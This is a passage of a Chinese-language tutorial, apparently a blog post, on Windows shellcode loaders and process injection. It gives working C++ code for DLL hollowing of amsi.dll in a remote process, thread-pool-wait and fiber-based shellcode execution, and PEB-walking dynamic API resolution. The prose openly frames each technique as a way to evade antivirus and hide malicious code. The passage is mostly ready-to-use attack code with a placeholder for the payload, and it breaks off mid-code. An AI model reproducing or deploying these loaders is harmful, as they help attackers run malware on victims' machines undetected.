class="line"><span class="comment">//这行代码告诉编译器，接下来的数据（如变量定义）将放置在名为.CRT$XLB的数据段中。</span></span><br><span class="line"><span class="comment">//.CRT$XLB是一个特殊的数据段名称，链接器将在其中寻找TLS回调函数的地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这行代码定义了一个名为_tls_callback的变量，其类型为PIMAGE_TLS_CALLBACK（一个指向TLS回调函数的指针）。</span></span><br><span class="line"><span class="comment">//此变量被初始化为指向TlsCallBack函数的地址</span></span><br><span class="line"><span class="comment">//由于我们在第一行代码中使用了#pragma data_seg指令，_tls_callback变量将被放置在.CRT$XLB数据段中</span></span><br><span class="line"><span class="comment">//.CRT$XLB是一个特定的数据段名称，与C运行时（C Runtime，CRT）机制有关。在这个名称中，各部分的含义如下：</span></span><br><span class="line"><span class="comment">//.CRT：这个前缀表示该数据段与C运行时机制相关。</span></span><br><span class="line"><span class="comment">//$：这个符号在数据段名称中用作分隔符。</span></span><br><span class="line"><span class="comment">//XL：这两个字符表示该数据段用于存储TLS回调函数地址。在链接器处理TLS回调时，它会查找具有这个前缀的数据段。</span></span><br><span class="line"><span class="comment">//B：这个字母表示数据段的顺序。这个字符可以是字母表中的B到Y之间的任意一个字母。这意味着可以定义多个TLS回调，链接器会按照字母顺序调用它们。</span></span><br><span class="line"><span class="comment">//需要注意的是，.CRT$XLA和.CRT$XLZ这两个数据段名称是保留的，用于C运行时库的内部实现，因此不应在用户代码中使用</span></span><br><span class="line"><span class="comment">//EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;</span></span><br><span class="line">EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这行代码告诉编译器恢复默认的数据段。</span></span><br><span class="line"><span class="comment">//这意味着在这个指令之后定义的数据（如变量定义）将被放置在默认的数据段中，而不是.CRT$XLB数据段</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg ()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;tls回调函数执行完后才执行我!&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="11-dll镂空注入"><a href="#11-dll镂空注入" class="headerlink" title="11.dll镂空注入"></a>11.dll镂空注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>模块镂空（DLL Hollowing）是一种Shellcode注入技术，它借鉴了进程镂空（Process Hollowing）的原理和思路。通过利用合法模块信息来伪装恶意代码，使得检测变得困难。虽然可以通过远程DLL注入的方式将整个恶意DLL注入目标系统，但这种方法较易被检测。例如，攻击者需要将恶意DLL上传到受害者主机，而杀毒软件可以通过监控Windows&#x2F;Temp&#x2F;等目录来拦截远程DLL注入。</p>
<p>相比之下，模块镂空不具备这样的风险，因为它是在带有微软签名的DLL中镂空一个区域。为了避免进程出错，不能直接在进程空间中已存在的DLL上进行镂空。取而代之的方法是先向目标进程远程注入一个合法的系统DLL，然后再镂空它。这样一来，我们就获得了一个与Windows模块相关联的Shellcode执行环境，既能规避安全检测，又能实现恶意代码执行</p>
<h2 id="代码实现思路"><a href="#代码实现思路" class="headerlink" title="代码实现思路"></a>代码实现思路</h2><ol>
<li><strong>确定要注入的目标进程：</strong>根据进程ID打开目标进程，获取其句柄（示例代码中的进程ID固定为2924，实际应用中可能需要根据需求进行调整）。</li>
<li><strong>将合法的DLL（如amsi.dll）注入目标进程：</strong>通过<code>VirtualAllocEx</code>和<code>WriteProcessMemory</code>将DLL名称写入远程进程的内存空间。然后，获取<code>LoadLibraryW</code>函数的地址，并在远程进程中创建一个新线程以调用该函数，实现DLL的加载。</li>
<li><strong>确定注入的DLL在目标进程中的基址：</strong>使用<code>EnumProcessModules</code>函数遍历目标进程中加载的所有模块，找到已注入的合法DLL（如amsi.dll）的基址。</li>
<li><strong>获取DLL的入口点：</strong>读取注入的DLL的PE头部信息，包括DOS头部和NT头部，从中获取DLL的入口点（AddressOfEntryPoint），并计算在目标进程中的实际地址。</li>
<li><strong>向DLL的入口点写入Shellcode：</strong>使用<code>WriteProcessMemory</code>将Shellcode写入目标进程的DLL入口点。</li>
<li><strong>执行Shellcode：</strong>在目标进程中创建一个新线程，以DLL的入口点作为线程的起始地址，从而在镂空的DLL内部执行Shellcode</li>
</ol>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将你的Shellcode放在这里</span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR ModuleName[] = <span class="string">L&quot;C:\\windows\\system32\\amsi.dll&quot;</span>; <span class="comment">//定义要注入的合法DLL的文件路径</span></span><br><span class="line">    HMODULE hModules[<span class="number">256</span>] = &#123;&#125;;  <span class="comment">//定义一个数组用于存储目标进程中加载的模块的句柄</span></span><br><span class="line">    SIZE_T hModulesSize = <span class="built_in">sizeof</span>(hModules); <span class="comment">//计算存储模块句柄数组的大小</span></span><br><span class="line">    DWORD hModulesSizeNeeded = <span class="number">0</span>;  <span class="comment">//用于存储EnumProcessModules函数返回的实际需要的缓冲区大小</span></span><br><span class="line"></span><br><span class="line">    DWORD moduleNameSize = <span class="number">0</span>;  <span class="comment">//定义变量用于存储模块名称的大小（未使用）</span></span><br><span class="line">    SIZE_T hModulesCount = <span class="number">0</span>;  <span class="comment">//计算目标进程中模块的数量</span></span><br><span class="line">    CHAR rModuleName[<span class="number">128</span>] = &#123;&#125;;  <span class="comment">//定义一个字符数组用于存储远程模块的名称</span></span><br><span class="line">    HMODULE rModule = <span class="literal">NULL</span>;  <span class="comment">//定义一个变量用于存储找到的远程模块的句柄</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 以可读写权限打开目标进程</span></span><br><span class="line">    <span class="comment">//hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="number">31652</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在远程进程中分配内存并写入待注入DLL的路径</span></span><br><span class="line">    LPVOID lprBuffer = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> ModuleName, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lprBuffer, (LPVOID)ModuleName, <span class="keyword">sizeof</span> ModuleName, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取LoadLibraryW函数的地址，用于在远程进程中加载DLL</span></span><br><span class="line">    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32&quot;</span>)), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建远程线程以加载DLL</span></span><br><span class="line">    HANDLE dllThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, threadRoutine, lprBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待远程线程加载完DLL</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(dllThread, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到在远程进程中注入的DLL的基地址</span></span><br><span class="line">    <span class="built_in">EnumProcessModules</span>(hProcess, hModules, hModulesSize, &amp;hModulesSizeNeeded);</span><br><span class="line">    hModulesCount = hModulesSizeNeeded / <span class="built_in">sizeof</span>(HMODULE);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; hModulesCount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rModule = hModules[i];</span><br><span class="line">        <span class="built_in">GetModuleBaseNameA</span>(hProcess, rModule, rModuleName, <span class="built_in">sizeof</span>(rModuleName));</span><br><span class="line">        <span class="keyword">if</span> (std::<span class="built_in">string</span>(rModuleName).<span class="built_in">compare</span>(<span class="string">&quot;amsi.dll&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取DLL的AddressOfEntryPoint</span></span><br><span class="line">    DWORD headerBufferSize = <span class="number">0x1000</span>;</span><br><span class="line">    LPVOID peHeader = <span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, headerBufferSize);</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(hProcess, rModule, peHeader, headerBufferSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peHeader;</span><br><span class="line">    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader + dosHeader-&gt;e_lfanew);</span><br><span class="line">    LPVOID dllEntryPoint = (LPVOID)(ntHeader-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)rModule);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将Shellcode写入DLL的AddressOfEntryPoint</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, dllEntryPoint, (LPCVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从注入的DLL中执行Shellcode</span></span><br><span class="line">    <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (PTHREAD_START_ROUTINE)dllEntryPoint, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="12-线程池等待"><a href="#12-线程池等待" class="headerlink" title="12.线程池等待"></a>12.线程池等待</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;填写shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ThreadPoolLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义一个DWORD变量，用于存储原始内存保护属性</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 修改shellcode所在内存的保护属性为可读、可写、可执行</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个事件对象，初始状态为有信号状态，使用默认安全属性，非手动重置，无名称</span></span><br><span class="line">    HANDLE event = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    CreateThreadpoolWait用于创建一个线程池等待对象的函数,</span></span><br><span class="line"><span class="comment">    程池等待对象允许您在等待内核对象（如事件、信号量等）变为有信号状态时执行特定的回调函数</span></span><br><span class="line"><span class="comment">    其语法格式如下:</span></span><br><span class="line"><span class="comment">    PTP_WAIT CreateThreadpoolWait(</span></span><br><span class="line"><span class="comment">      PTP_WAIT_CALLBACK pfnwa,  //指向回调函数的指针</span></span><br><span class="line"><span class="comment">      PVOID              pv,   //传递给回调函数的参数</span></span><br><span class="line"><span class="comment">      PTP_CALLBACK_ENVIRON pcbe  //指向线程池回调环境的指针,置NULL则表示使用默认的环境</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 创建一个线程池等待对象，关联到shellcode作为回调函数，回调函数参数和线程池环境为NULL</span></span><br><span class="line">    PTP_WAIT threadPoolWait = <span class="built_in">CreateThreadpoolWait</span>((PTP_WAIT_CALLBACK)(LPVOID)shellcode, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    SetThreadpoolWait函数用于线程池中添加等待对象的函数。</span></span><br><span class="line"><span class="comment">    当等待的内核对象（如事件、信号量等）变为有信号状态时，线程池会调用与等待对象关联的回调函数</span></span><br><span class="line"><span class="comment">    其语法格式如下:</span></span><br><span class="line"><span class="comment">    VOID SetThreadpoolWait(</span></span><br><span class="line"><span class="comment">      PTP_WAIT pwa,  //指向要添加到线程池的等待对象的指针</span></span><br><span class="line"><span class="comment">      HANDLE   hObject,  //要等待的内核对象的句柄,当这个内核对象变为有信号状态时,线程池会调用与等待对象关联的回调函数</span></span><br><span class="line"><span class="comment">      PFILETIME pftTimeout  //指向一个FILETIME结构的指针，表示等待超时的时间</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 将等待对象添加到线程池中,当事件对象event触发（变为有信号状态）时，线程池会调用与threadPoolWait关联的回调函数</span></span><br><span class="line">    <span class="built_in">SetThreadpoolWait</span>(threadPoolWait, event, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待事件对象变为无信号状态（表示shellcode执行完毕），无限等待</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(event, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">ThreadPoolLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="13-创建纤程加载"><a href="#13-创建纤程加载" class="headerlink" title="13.创建纤程加载"></a>13.创建纤程加载</h1><h2 id="什么是纤程"><a href="#什么是纤程" class="headerlink" title="什么是纤程"></a>什么是纤程</h2><p>纤程（Fiber）是一种轻量级的线程，也被称为协程（Coroutine）或微线程（Microthread）。它们是一种用户级别的线程，由程序自身管理，而不是由操作系统内核管理。纤程是一种可以提高程序执行效率的调度机制，特别适用于需要大量并发执行任务的场景</p>
<h2 id="实现代码-4"><a href="#实现代码-4" class="headerlink" title="实现代码"></a>实现代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改shellcode所在内存的保护属性为可读、可写、可执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将当前线程转换为纤程（轻量级线程）</span></span><br><span class="line">    <span class="built_in">ConvertThreadToFiber</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个纤程对象，关联到shellcode作为纤程入口点，使用默认栈大小和无标志位</span></span><br><span class="line">    <span class="type">void</span>* shellcodeFiber = <span class="built_in">CreateFiber</span>(<span class="number">0</span>, (LPFIBER_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切换到新创建的纤程，开始执行shellcode</span></span><br><span class="line">    <span class="built_in">SwitchToFiber</span>(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// shellcode执行完毕后，删除纤程对象</span></span><br><span class="line">    <span class="built_in">DeleteFiber</span>(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="14-动态api函数加载"><a href="#14-动态api函数加载" class="headerlink" title="14.动态api函数加载"></a>14.动态api函数加载</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>传统的静态导入API函数会在可执行文件的导入表中明确列出所有用到的函数。这使得恶意代码容易被安全工具和分析人员发现，因为敏感API函数的使用通常表明了恶意行为。</p>
<p>而动态调用API函数，如本示例中的代码所展示的，可以在运行时动态解析并获取API函数的地址。这样，敏感函数不会出现在导入表中，从而使得恶意代码更难被发现。此外，动态调用API函数还可以结合其他技术（如代码混淆、加密等）来进一步提高恶意代码的隐蔽性</p>
<h2 id="实现思路-1"><a href="#实现思路-1" class="headerlink" title="实现思路"></a>实现思路</h2><ul>
<li>定位关键模块：首先找到包含核心API函数的关键模块（如kernel32.dll）。这通常可以通过解析PEB（Process Environment Block）中的模块列表来完成。</li>
<li>获取GetProcAddress：定位到kernel32.dll后，需要解析导出表（Export Table）以获取GetProcAddress函数的地址。GetProcAddress是一个核心函数，用于在运行时动态解析其他API函数的地址。</li>
<li>加载其他API：通过GetProcAddress函数，可以逐个获取其他需要的API函数的地址。例如，可以通过GetProcAddress获取VirtualProtect、CreateThread和WaitForSingleObject等函数的地址。</li>
<li>准备Shellcode：将Shellcode存储在缓冲区中，使用VirtualProtect函数将缓冲区的内存页属性更改为可执行，以确保可以安全地执行Shellcode。</li>
<li>创建线程并执行Shellcode：使用CreateThread函数创建一个新线程，并将Shellcode的地址作为线程的启动例程。线程创建后，使用WaitForSingleObject等待线程执行完成</li>
</ul>
<h2 id="x86代码实现"><a href="#x86代码实现" class="headerlink" title="x86代码实现"></a>x86代码实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明定义api函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* p_GetProcAddress)</span><span class="params">(_In_ HMODULE hModule, _In_ LPCSTR lpProcName)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* p_LoadLibraryA)</span><span class="params">(__in LPCSTR lpLibFileName)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* p_VirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* p_CreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* p_WaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内联汇编函数，用于获取Kernel32.dll模块的基地址</span></span><br><span class="line">HMODULE <span class="keyword">inline</span> __declspec(naked) <span class="built_in">GetKernel32Moudle</span>()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, fs: [<span class="number">0x30</span>] ;</span><br><span class="line">        mov eax, [eax + <span class="number">0xc</span>];</span><br><span class="line">        mov eax, [eax + <span class="number">0x14</span>]</span><br><span class="line">            mov eax, [eax];</span><br><span class="line">        mov eax, [eax];</span><br><span class="line">        mov eax, [eax + <span class="number">0x10</span>];</span><br><span class="line">        ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取GetProcAddress函数的地址</span></span><br><span class="line"><span class="function">DWORD <span class="title">pGetProcAddress</span><span class="params">(HMODULE Kernel32Base)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> szGetProcAddr[] = &#123; <span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    DWORD result = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历kernel32.dll的导出表，找到GetProcAddr函数地址</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)Kernel32Base;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)((DWORD)Kernel32Base + pDosHead-&gt;e_lfanew);</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp;pNtHead-&gt;OptionalHeader;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)Kernel32Base + pOptHead-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    DWORD* pAddOfFun_Raw = (DWORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfFunctions);</span><br><span class="line">    WORD* pAddOfOrd_Raw = (WORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line">    DWORD* pAddOfNames_Raw = (DWORD*)((DWORD)Kernel32Base + pExport-&gt;AddressOfNames);</span><br><span class="line">    <span class="type">char</span>* pFinded = <span class="literal">NULL</span>, * pSrc = szGetProcAddr;</span><br><span class="line">    <span class="keyword">for</span> (DWORD dwCnt = <span class="number">0</span>; dwCnt &lt; pExport-&gt;NumberOfNames; dwCnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        pFinded = (<span class="type">char</span>*)((DWORD)Kernel32Base + pAddOfNames_Raw[dwCnt]);</span><br><span class="line">        <span class="keyword">while</span> (*pFinded &amp;&amp; *pFinded == *pSrc)</span><br><span class="line">        &#123;</span><br><span class="line">            pFinded++; pSrc++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*pFinded == *pSrc)</span><br><span class="line">        &#123;</span><br><span class="line">            result = (DWORD)Kernel32Base + pAddOfFun_Raw[pAddOfOrd_Raw[dwCnt]];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pSrc = szGetProcAddr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span 